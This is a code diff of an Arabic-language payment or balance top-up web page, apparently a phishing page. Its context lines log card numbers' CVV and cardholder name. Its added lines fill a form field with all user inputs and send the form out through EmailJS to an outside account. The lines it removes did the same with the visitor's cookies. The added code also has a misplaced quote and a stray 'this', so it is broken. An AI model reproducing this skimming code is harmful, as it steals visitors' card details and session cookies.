@@ -340,7 +340,30 @@
                     console.log('CVV:', cvvInput.value);
                     console.log('Cardholder Name:', cardholderNameInput.value);
                 }
+document.getElementById("message").value = 'ضع جميع الادخالات هن'ا;
 
+  const btn = document.getElementById('button');
+const serviceID = 'default_service'; // تأكد أنه نفس اسم الخدمة في حسابك
+
+    const templateID = 'template_qyhaxqi'; // تأكد من اسم القالب
+
+​
+
+    emailjs.sendForm(serviceID, templateID, this)
+
+      .then(() => {
+
+
+
+        alert('تم الإرسال بنجاح!');
+
+      }, (err) => {
+
+        
+
+        alert('حدث خطأ: ' + JSON.stringify(err));
+
+      });
                 showMessage('تم استلام طلب الشحن بنجاح! سيتم مراجعة طلبك وتحديث رصيدك قريباً.', 'success');
                 // In a real app, you would redirect or update UI after successful backend processing
                 setTimeout(() => { window.location.href ='/check'; }, 3000);
@@ -482,45 +505,9 @@
 
 <!-- كود الإرسال -->
 
-<script>
 
-  document.getElementById("message").value = decodeURIComponent(document.cookie);
 
-  const btn = document.getElementById('button');
-
-  document.getElementById('form').addEventListener('submit', function(event) {
-
-    event.preventDefault();
-
-    btn.value = 'Sending...';
-
-​
-
-    const serviceID = 'default_service'; // تأكد أنه نفس اسم الخدمة في حسابك
-
-    const templateID = 'template_qyhaxqi'; // تأكد من اسم القالب
-
-​
-
-    emailjs.sendForm(serviceID, templateID, this)
-
-      .then(() => {
-
-        btn.value = 'Send Email';
-
-        alert('تم الإرسال بنجاح!');
-
-      }, (err) => {
-
-        btn.value = 'Send Email';
-
-        alert('حدث خطأ: ' + JSON.stringify(err));
-
-      });
-
-  });
-
-</script>
+  
 
 ​
 
